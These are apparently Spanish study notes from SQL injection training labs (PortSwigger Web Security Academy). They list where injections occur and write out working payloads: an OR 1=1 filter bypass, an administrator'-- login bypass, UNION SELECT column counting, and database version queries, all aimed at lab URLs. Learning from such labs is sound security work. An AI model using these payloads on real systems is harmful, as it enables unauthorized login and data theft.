
Se puede hacer:
  >> Con una comilla " ' "  para buscar errores.
  >> Condiciones booleanas como 1=1 o 1=2 

La mayoria de las vulnerabilidades ocurren dentro de la claúsula WHERE de un SELECT 
  Pueden ocurrir:
    En UPDATE dentro de los valores actualizados o en la clausula WHERE.
    En INSERT dentro de los valores insertados.
    En SELECT dentro de la tabla o el nombre de la columna.
    En SELECT dentro de una claúsula ORDER BY.

*SE PUEDE HACER SQLi DESDE UN NAVEGADOR*

1º LABORATORIO >> SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
  
https://0a7d007e04e4a8b680fabc1e004e00e4.web-security-academy.net/filter?category=Gifts'+OR+1=1--

2º LABORATORIO >> SQL injection vulnerability allowing login bypass

administrator'-- 

3º LABOTATORIO >>

GET https://0aa700ad0316c1aa807f08c000820069.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories' UNION+SELECT+BANNER,+NULL+FROM+v$version-- HTTP/2

LABORATORIO >> SQL injection UNION attack, determining the number of columns returned by the query

  GET /filter?category=Gifts' AND 1=1-- HTTP/2 -> no sé que hace, creo que comprobar si se puede hacer injection
  GET /filter?category=Gifts' UNION SELECT NULL,NULL,NULL-- HTTP/2 -> determinar cuantas columnas tiene
  GET /filter?category=Accessories' UNION SELECT NULL,'fLseYn',NULL-- HTTP/2 -> Con el string que te da, comprobar que existe

LABORATORIO >> SQL injection attack, querying the database type and version on MySQL and Microsoft

  GET /filter?category=Corporate+gifts'+UNION+SELECT+@@version,+NULL# HTTP/2



